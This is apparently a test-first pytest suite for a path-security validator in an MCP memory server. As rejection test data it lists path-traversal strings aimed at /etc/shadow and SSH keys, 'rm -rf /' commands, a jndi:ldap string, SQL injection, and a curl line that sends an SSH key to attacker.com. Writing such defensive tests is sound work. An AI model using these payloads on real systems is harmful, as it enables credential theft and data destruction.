"""
TDD Test Suite: Path Security Validation Components

CRITICAL TDD APPROACH: These tests define the security requirements FIRST.
The path_security.py component DOES NOT EXIST YET - these tests will fail.

SECURITY FOCUS: Comprehensive path validation, injection prevention, and file operation security.
ATTACK VECTORS TESTED: Path traversal, code injection, system file access, malicious patterns.
PERFORMANCE TARGET: All path validation operations must complete in <3ms
"""

import pytest
import os
import tempfile
import shutil
from pathlib import Path
import time
import re
from typing import List, Dict, Any
import uuid


class TestSecurePathValidator:
    """
    TDD Security Tests: Secure Path Validation
    
    Testing the SecurePathValidator class that prevents various path-based attacks.
    
    CRITICAL: These tests define EXACT security behavior required.
    ALL TESTS WILL FAIL INITIALLY - this is correct TDD methodology.
    """
    
    @pytest.fixture
    def temp_secure_root(self):
        """Create temporary secure root directory for testing."""
        temp_dir = tempfile.mkdtemp(prefix="ltmc_secure_test_")
        yield Path(temp_dir)
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    @pytest.fixture
    def path_validator(self, temp_secure_root):
        """
        Create SecurePathValidator instance.
        
        THIS WILL FAIL: The class doesn't exist yet.
        Defines interface and behavior we need to implement.
        """
        from ltms.security.path_security import SecurePathValidator
        
        return SecurePathValidator(secure_root=temp_secure_root)
    
    def test_secure_path_validator_initialization(self, temp_secure_root):
        """
        TDD Test 1: Verify SecurePathValidator can be instantiated.
        
        EXPECTED TO FAIL: Component doesn't exist yet.
        """
        from ltms.security.path_security import SecurePathValidator
        
        validator = SecurePathValidator(secure_root=temp_secure_root)
        
        assert validator is not None
        assert validator.secure_root == temp_secure_root
        assert hasattr(validator, 'DANGEROUS_PATTERNS')
        assert hasattr(validator, 'ALLOWED_EXTENSIONS')
    
    def test_validate_file_operation_allows_safe_paths(self, path_validator):
        """
        TDD Test 2: Safe file paths should be allowed.
        
        EXPECTED TO FAIL: validate_file_operation method doesn't exist.
        """
        safe_paths = [
            "data/user_files/document.txt",
            "temp/processing/output.json", 
            "uploads/images/photo.jpg",
            "cache/embeddings/vectors.bin",
            "logs/application/debug.log"
        ]
        
        for safe_path in safe_paths:
            assert path_validator.validate_file_operation(
                safe_path, "read", "test_project"
            ) is True
    
    def test_validate_file_operation_blocks_path_traversal(self, path_validator):
        """
        TDD Test 3: Path traversal attacks must be blocked.
        
        CRITICAL SECURITY: Must prevent access to parent directories.
        EXPECTED TO FAIL: SecurityError exception doesn't exist.
        """
        from ltms.security.path_security import SecurityError
        
        path_traversal_attacks = [
            # Basic traversal attempts
            "../../../etc/passwd",
            "data/../../../etc/shadow", 
            "uploads/../../usr/bin/sh",
            
            # URL encoded traversal
            "data/%2e%2e/%2e%2e/etc/passwd",
            "temp/%2e%2e%2f%2e%2e%2fsystem/file",
            
            # Double encoding
            "data/%252e%252e/%252e%252e/etc/hosts",
            
            # Unicode encoding attempts
            "data/\u002e\u002e/\u002e\u002e/etc/passwd",
            
            # Null byte injection
            "safe_file.txt\x00../../../etc/passwd",
            
            # Windows-style traversal (cross-platform testing)
            "data\\..\\..\\..\\windows\\system32\\config\\sam",
            
            # Mixed separators
            "data/../..\\../etc/passwd",
            
            # Relative path with current directory
            "./../../etc/passwd",
            
            # Multiple traversal patterns
            "data/../temp/../../../etc/passwd"
        ]
        
        for malicious_path in path_traversal_attacks:
            with pytest.raises(SecurityError, match="Path traversal|Dangerous pattern"):
                path_validator.validate_file_operation(
                    malicious_path, "read", "test_project"
                )
    
    def test_validate_file_operation_blocks_system_directories(self, path_validator):
        """
        TDD Test 4: System directories must be blocked.
        
        SECURITY REQUIREMENT: Prevent access to sensitive system paths.
        """
        from ltms.security.path_security import SecurityError
        
        system_paths = [
            # Unix/Linux system directories
            "/etc/passwd",
            "/etc/shadow", 
            "/root/.ssh/id_rsa",
            "/proc/self/environ",
            "/sys/class/dmi/id/product_uuid",
            "/dev/kmsg",
            "/var/log/auth.log",
            "/home/user/.bash_history",
            
            # Python system paths
            "/usr/lib/python3.11/os.py",
            "/usr/local/lib/python3.11/subprocess.py",
            
            # Application sensitive paths
            "/var/lib/ltmc/config/secrets.env",
            "/opt/ltmc/private_keys/",
            
            # Temporary but sensitive paths
            "/tmp/ltmc_admin_session",
            "/var/tmp/root_access_token"
        ]
        
        for system_path in system_paths:
            with pytest.raises(SecurityError, match="System directory|Dangerous pattern"):
                path_validator.validate_file_operation(
                    system_path, "read", "test_project"
                )
    
    def test_validate_file_operation_blocks_code_injection_patterns(self, path_validator):
        """
        TDD Test 5: Code injection patterns must be blocked.
        
        SECURITY REQUIREMENT: Prevent code execution through path manipulation.
        """
        from ltms.security.path_security import SecurityError
        
        injection_patterns = [
            # Python code injection
            "__import__('os').system('rm -rf /')",
            "eval('malicious_code()')",
            "exec('import subprocess; subprocess.run([\"rm\", \"-rf\", \"/\"])')",
            
            # Shell command injection
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget malicious.com/payload",
            "`cat /etc/shadow`",
            "$(cat /etc/passwd)",
            
            # SQL injection patterns (in filename)
            "'; DROP TABLE users; --",
            "' UNION SELECT password FROM admin_users --",
            
            # Template injection
            "{{7*7}}",
            "${jndi:ldap://malicious.com/exploit}",
            
            # File operation injection
            "file.txt; cat /etc/passwd > output.txt",
            "document.pdf && curl attacker.com/steal?data=$(cat secrets.txt)"
        ]
        
        for injection_attempt in injection_patterns:
            with pytest.raises(SecurityError, match="Dangerous pattern|Code injection"):
                path_validator.validate_file_operation(
                    injection_attempt, "write", "test_project"
                )
    
    def test_validate_file_operation_handles_operation_types(self, path_validator):
        """
        TDD Test 6: Different operation types should have appropriate validation.
        
        EXPECTED TO FAIL: Operation-specific validation doesn't exist.
        """
        safe_file = "data/test_file.txt"
        
        # Read operations should be most permissive
        assert path_validator.validate_file_operation(safe_file, "read", "test_project") is True
        
        # Write operations need additional validation
        assert path_validator.validate_file_operation(safe_file, "write", "test_project") is True
        
        # Execute operations should be most restrictive
        from ltms.security.path_security import SecurityError
        
        # Unsafe executable should be blocked
        with pytest.raises(SecurityError, match="Unsafe executable"):
            path_validator.validate_file_operation(
                "data/malicious_script.sh", "execute", "test_project"
            )
    
    def test_sanitize_user_input_removes_dangerous_characters(self, path_validator):
        """
        TDD Test 7: User input sanitization.
        
        EXPECTED TO FAIL: sanitize_user_input method doesn't exist.
        """
        dangerous_inputs = [
            'normal text with <script>alert("xss")</script>',
            'sql injection "; DROP TABLE users; --',
            'command injection && rm -rf /',
            'path injection ../../../etc/passwd',
            'null byte injection\x00malicious'
        ]
        
        for dangerous_input in dangerous_inputs:
            sanitized = path_validator.sanitize_user_input(dangerous_input)
            
            # Should remove dangerous characters
            assert '<' not in sanitized
            assert '>' not in sanitized
            assert ';' not in sanitized
            assert '"' not in sanitized
            assert "'" not in sanitized
            assert '\x00' not in sanitized
    
    def test_sanitize_user_input_respects_length_limits(self, path_validator):
        """
        TDD Test 8: Input length validation.
        
        SECURITY REQUIREMENT: Prevent buffer overflow and DoS attacks.
        """
        from ltms.security.path_security import SecurityError
        
        # Normal length should pass
        normal_input = "A" * 100
        sanitized = path_validator.sanitize_user_input(normal_input)
        assert len(sanitized) == 100
        
        # Excessive length should be rejected
        with pytest.raises(SecurityError, match="exceeds maximum length"):
            excessive_input = "A" * 50000  # Way too long
            path_validator.sanitize_user_input(excessive_input, max_length=10000)
    
    def test_is_safe_executable_validates_file_extensions(self, path_validator):
        """
        TDD Test 9: Executable file validation.
        
        EXPECTED TO FAIL: _is_safe_executable method doesn't exist.
        """
        # Safe executable extensions (if any are allowed)
        safe_executables = [
            "script.py",  # Python scripts might be allowed in controlled environment
            "config.json",  # Configuration files
            "data.csv"  # Data files
        ]
        
        # Dangerous executable extensions
        dangerous_executables = [
            "malware.exe",
            "script.sh", 
            "program.bat",
            "library.so",
            "payload.dll",
            "script.ps1",
            "program.cmd"
        ]
        
        for safe_exe in safe_executables:
            # This might be allowed (depending on implementation)
            try:
                result = path_validator._is_safe_executable(safe_exe)
                # If method exists, it should return boolean
                assert isinstance(result, bool)
            except AttributeError:
                # Expected - method doesn't exist yet
                pass
        
        for dangerous_exe in dangerous_executables:
            # These should never be allowed
            if hasattr(path_validator, '_is_safe_executable'):
                assert path_validator._is_safe_executable(dangerous_exe) is False


class TestPathSecurityPerformance:
    """
    TDD Performance Tests: Path Security Validation
    
    PERFORMANCE REQUIREMENT: All path validation must complete in <3ms
    Security must not become a performance bottleneck.
    """
    
    @pytest.fixture
    def performance_path_validator(self, tmp_path):
        """Set up path validator for performance testing."""
        from ltms.security.path_security import SecurePathValidator
        
        return SecurePathValidator(secure_root=tmp_path)
    
    def test_path_traversal_detection_performance(self, performance_path_validator):
        """
        TDD Performance Test 1: Path traversal detection speed.
        
        REQUIREMENT: Must quickly detect path traversal attacks.
        EXPECTED TO FAIL: Component doesn't exist.
        """
        from ltms.security.path_security import SecurityError
        
        # Create variety of malicious paths for testing
        malicious_paths = []
        for i in range(100):
            malicious_paths.extend([
                f"data/{i}/../../../etc/passwd",
                f"temp/{i}/../../sensitive/file.txt", 
                f"../../../usr/bin/dangerous_{i}",
                f"uploads/{i}/.././../system/file.{i}"
            ])
        
        start_time = time.perf_counter()
        
        for malicious_path in malicious_paths:
            with pytest.raises(SecurityError):
                performance_path_validator.validate_file_operation(
                    malicious_path, "read", "test_project"
                )
        
        end_time = time.perf_counter()
        avg_time_ms = ((end_time - start_time) / len(malicious_paths)) * 1000
        
        assert avg_time_ms < 3.0, f"Path traversal detection too slow: {avg_time_ms:.2f}ms"
    
    def test_safe_path_validation_performance(self, performance_path_validator):
        """
        TDD Performance Test 2: Safe path validation speed.
        
        REQUIREMENT: Valid paths must be validated quickly for normal operations.
        """
        # Create variety of safe paths
        safe_paths = []
        for i in range(500):
            safe_paths.extend([
                f"data/user_{i}/document.txt",
                f"temp/processing_{i}/output.json",
                f"cache/embeddings/vectors_{i}.bin",
                f"uploads/files/upload_{i}.pdf"
            ])
        
        start_time = time.perf_counter()
        
        for safe_path in safe_paths:
            result = performance_path_validator.validate_file_operation(
                safe_path, "read", "test_project"
            )
            assert result is True
        
        end_time = time.perf_counter()
        avg_time_ms = ((end_time - start_time) / len(safe_paths)) * 1000
        
        assert avg_time_ms < 1.0, f"Safe path validation too slow: {avg_time_ms:.2f}ms"
    
    def test_input_sanitization_performance(self, performance_path_validator):
        """
        TDD Performance Test 3: Input sanitization speed.
        
        High-frequency operation that must remain fast.
        """
        # Create variety of inputs that need sanitization
        inputs_to_sanitize = []
        for i in range(200):
            inputs_to_sanitize.extend([
                f'User input {i} with <script>alert("xss")</script>',
                f'SQL injection attempt {i} "; DROP TABLE users_{i}; --',
                f'Command injection {i} && rm -rf /tmp/file_{i}',
                f'Mixed dangerous content {i} <>";\'/bin/sh',
                f'Normal safe content for user {i} in project'
            ])
        
        start_time = time.perf_counter()
        
        for user_input in inputs_to_sanitize:
            sanitized = performance_path_validator.sanitize_user_input(user_input)
            assert isinstance(sanitized, str)
        
        end_time = time.perf_counter()
        avg_time_ms = ((end_time - start_time) / len(inputs_to_sanitize)) * 1000
        
        assert avg_time_ms < 2.0, f"Input sanitization too slow: {avg_time_ms:.2f}ms"
    
    def test_pattern_matching_performance(self, performance_path_validator):
        """
        TDD Performance Test 4: Dangerous pattern detection speed.
        
        Security pattern matching must be optimized.
        """
        from ltms.security.path_security import SecurityError
        
        # Mix of dangerous and safe patterns
        test_patterns = []
        for i in range(300):
            test_patterns.extend([
                # Dangerous patterns that should be caught
                f"__import__('{i}_malicious_module')",
                f"eval('dangerous_code_{i}()')",
                f"; rm -rf /tmp/target_{i}",
                # Safe patterns that should pass
                f"normal_filename_{i}.txt",
                f"data/user_{i}/safe_document.pdf"
            ])
        
        start_time = time.perf_counter()
        
        dangerous_count = 0
        safe_count = 0
        
        for pattern in test_patterns:
            try:
                performance_path_validator.validate_file_operation(
                    pattern, "read", "test_project"
                )
                safe_count += 1
            except SecurityError:
                dangerous_count += 1
        
        end_time = time.perf_counter()
        avg_time_ms = ((end_time - start_time) / len(test_patterns)) * 1000
        
        # Verify we caught some dangerous patterns and allowed some safe ones
        assert dangerous_count > 0, "Should have detected some dangerous patterns"
        assert safe_count > 0, "Should have allowed some safe patterns"
        assert avg_time_ms < 2.5, f"Pattern matching too slow: {avg_time_ms:.2f}ms"


class TestPathSecurityIntegration:
    """
    TDD Integration Tests: Path Security with LTMC System
    
    Tests path security integration with actual LTMC MCP tools.
    CRITICAL: Tests real system integration, not mocked components.
    """
    
    @pytest.fixture
    def ltmc_server_process(self):
        """
        Start actual LTMC server for integration testing.
        
        PHASE 0 REQUIREMENT: System must start successfully before testing.
        """
        import subprocess
        import time
        import requests
        
        # Kill any existing processes
        try:
            subprocess.run(["pkill", "-f", "ltmc_mcp_server_http.py"], check=False)
            time.sleep(2)
        except Exception:
            pass
        
        # Start server
        process = subprocess.Popen(
            ["python", "ltmc_mcp_server_http.py"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd="/home/feanor/Projects/lmtc"
        )
        
        # Wait for server to start
        for _ in range(30):
            try:
                response = requests.get("http://localhost:5050/health", timeout=1)
                if response.status_code == 200:
                    break
            except requests.RequestException:
                time.sleep(1)
                continue
        else:
            process.kill()
            pytest.skip("LTMC server failed to start - cannot test integration")
        
        yield process
        
        # Cleanup
        try:
            process.terminate()
            process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            process.kill()
            process.wait()
    
    def test_path_traversal_blocked_in_store_memory(self, ltmc_server_process):
        """
        TDD Integration Test 1: Path traversal attacks blocked in store_memory.
        
        EXPECTED TO FAIL: store_memory doesn't validate file_name parameter yet.
        """
        import requests
        
        path_traversal_filenames = [
            "../../../etc/passwd",
            "../../sensitive/data.txt",
            "../../../../usr/bin/sh",
            "data/../../../root/.ssh/id_rsa"
        ]
        
        for malicious_filename in path_traversal_filenames:
            payload = {
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": {
                    "name": "store_memory",
                    "arguments": {
                        "file_name": malicious_filename,  # Should be blocked
                        "content": "Malicious content",
                        "resource_type": "document"
                    }
                },
                "id": 1
            }
            
            response = requests.post(
                "http://localhost:5050/jsonrpc",
                json=payload,
                timeout=10
            )
            
            assert response.status_code == 200
            result = response.json()
            
            # Should fail with security error
            assert result["result"]["success"] is False
            error_msg = result["result"]["error"].lower()
            assert any(keyword in error_msg for keyword in [
                "path traversal", "security", "dangerous", "blocked"
            ]), f"Path traversal not blocked: {malicious_filename}"
    
    def test_code_injection_blocked_in_user_inputs(self, ltmc_server_process):
        """
        TDD Integration Test 2: Code injection blocked in user inputs.
        
        EXPECTED TO FAIL: MCP tools don't sanitize inputs yet.
        """
        import requests
        
        injection_attempts = [
            '__import__("os").system("rm -rf /")',
            'eval("malicious_code()")',
            '; cat /etc/passwd > /tmp/stolen_data',
            '`curl attacker.com/steal?data=$(cat ~/.ssh/id_rsa)`'
        ]
        
        for injection_code in injection_attempts:
            # Test injection in content parameter
            payload = {
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": {
                    "name": "store_memory",
                    "arguments": {
                        "file_name": "safe_filename.txt",
                        "content": injection_code,  # Malicious content
                        "resource_type": "document"
                    }
                },
                "id": 2
            }
            
            response = requests.post(
                "http://localhost:5050/jsonrpc", 
                json=payload,
                timeout=10
            )
            
            assert response.status_code == 200
            result = response.json()
            
            # Should either block the injection or sanitize it
            if result["result"]["success"]:
                # If stored, verify content was sanitized
                retrieve_payload = {
                    "jsonrpc": "2.0",
                    "method": "tools/call",
                    "params": {
                        "name": "retrieve_memory",
                        "arguments": {
                            "query": "safe_filename",
                            "limit": 1
                        }
                    },
                    "id": 3
                }
                
                retrieve_response = requests.post(
                    "http://localhost:5050/jsonrpc",
                    json=retrieve_payload,
                    timeout=10
                )
                
                retrieve_result = retrieve_response.json()
                if retrieve_result["result"]["results"]:
                    stored_content = str(retrieve_result["result"]["results"][0])
                    
                    # Dangerous patterns should be removed/sanitized
                    dangerous_patterns = ["__import__", "eval(", "system(", "cat /etc"]
                    for pattern in dangerous_patterns:
                        assert pattern not in stored_content, f"Dangerous pattern not sanitized: {pattern}"
            else:
                # Should fail with security error
                error_msg = result["result"]["error"].lower()
                assert any(keyword in error_msg for keyword in [
                    "security", "injection", "dangerous", "blocked", "sanitized"
                ]), f"Code injection not handled properly: {injection_code}"
    
    def test_system_file_access_blocked(self, ltmc_server_process):
        """
        TDD Integration Test 3: System file access should be blocked.
        
        EXPECTED TO FAIL: System path validation doesn't exist yet.
        """
        import requests
        
        system_file_attempts = [
            "/etc/passwd",
            "/etc/shadow", 
            "/root/.bash_history",
            "/proc/self/environ",
            "/var/log/auth.log",
            "/home/user/.ssh/id_rsa"
        ]
        
        for system_file in system_file_attempts:
            payload = {
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": {
                    "name": "store_memory",
                    "arguments": {
                        "file_name": system_file,  # Should be blocked
                        "content": "Attempting system file access",
                        "resource_type": "document"
                    }
                },
                "id": 4
            }
            
            response = requests.post(
                "http://localhost:5050/jsonrpc",
                json=payload,
                timeout=10
            )
            
            assert response.status_code == 200
            result = response.json()
            
            # Should fail with security error
            assert result["result"]["success"] is False
            error_msg = result["result"]["error"].lower()
            assert any(keyword in error_msg for keyword in [
                "system", "security", "blocked", "unauthorized", "dangerous"
            ]), f"System file access not blocked: {system_file}"


class TestPathSecurityEdgeCases:
    """
    TDD Edge Case Tests: Advanced Path Security Scenarios
    
    Tests complex and edge case security scenarios.
    """
    
    @pytest.fixture
    def edge_case_validator(self, tmp_path):
        """Create validator for edge case testing."""
        from ltms.security.path_security import SecurePathValidator
        return SecurePathValidator(secure_root=tmp_path)
    
    def test_unicode_normalization_attacks(self, edge_case_validator):
        """
        TDD Edge Case Test 1: Unicode normalization attacks.
        
        EXPECTED TO FAIL: Unicode attack prevention doesn't exist.
        """
        from ltms.security.path_security import SecurityError
        
        unicode_attacks = [
            # Unicode path traversal
            "data/\u002e\u002e/\u002e\u002e/etc/passwd",
            # Homoglyph attacks
            "datа/file.txt",  # Cyrillic 'а' instead of Latin 'a'
            # Zero-width characters
            "data/\u200bfile.txt",
            # Right-to-left override
            "data/\u202efile.txt"
        ]
        
        for unicode_attack in unicode_attacks:
            with pytest.raises(SecurityError):
                edge_case_validator.validate_file_operation(
                    unicode_attack, "read", "test_project"
                )
    
    def test_filesystem_case_sensitivity_attacks(self, edge_case_validator):
        """
        TDD Edge Case Test 2: Case sensitivity bypass attempts.
        
        Tests for bypasses using case variations.
        """
        from ltms.security.path_security import SecurityError
        
        case_bypass_attempts = [
            "DATA/../../../etc/passwd",  # Uppercase
            "Data/../../../etc/PASSWD",  # Mixed case
            "dAtA/../../../ETC/passwd",  # Random case
            "temp/TEMP/../../../etc/shadow"
        ]
        
        for case_attack in case_bypass_attempts:
            with pytest.raises(SecurityError):
                edge_case_validator.validate_file_operation(
                    case_attack, "read", "test_project"
                )
    
    def test_length_based_attacks(self, edge_case_validator):
        """
        TDD Edge Case Test 3: Length-based attack prevention.
        
        Tests buffer overflow and DoS prevention.
        """
        from ltms.security.path_security import SecurityError
        
        # Extremely long path that might cause buffer overflow
        long_path = "data/" + "A" * 10000 + "/file.txt"
        
        with pytest.raises(SecurityError, match="length|size|buffer"):
            edge_case_validator.validate_file_operation(
                long_path, "read", "test_project"
            )
        
        # Path with many directory levels
        deep_path = "/".join(["dir"] * 1000) + "/file.txt"
        
        with pytest.raises(SecurityError):
            edge_case_validator.validate_file_operation(
                deep_path, "read", "test_project"
            )


if __name__ == "__main__":
    """
    TDD Test Execution: Path Security Validation Tests
    
    Run with: python -m pytest tests/security/test_path_security.py -v
    
    EXPECTED RESULT: ALL TESTS SHOULD FAIL initially.
    This confirms we're testing the right security functionality before implementation.
    """
    import sys
    import os
    
    # Add project root to path
    project_root = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
    sys.path.insert(0, project_root)
    
    print("🔴 TDD PATH SECURITY TESTS")
    print("Expected: ALL TESTS WILL FAIL (components don't exist yet)")
    print("This validates our TDD approach - security requirements defined first!")
    print("=" * 70)
    
    # Run tests with verbose output
    exit_code = pytest.main([
        __file__,
        "-v",
        "--tb=short", 
        "--no-header"
    ])
    
    if exit_code != 0:
        print("=" * 70)
        print("✅ TDD SUCCESS: Security tests failed as expected!")
        print("💡 Next step: Implement path security components")
        print("📁 Need to create: ltms/security/path_security.py")
        print("🔧 Need to implement: SecurePathValidator class")
        print("🛡️  Security requirements clearly defined by failing tests")
    else:
        print("=" * 70)
        print("❌ TDD ISSUE: Tests should fail but didn't!")
        print("🤔 Check: Are security components already implemented?")
    
    sys.exit(0)  # Always exit 0 for TDD - failures are expected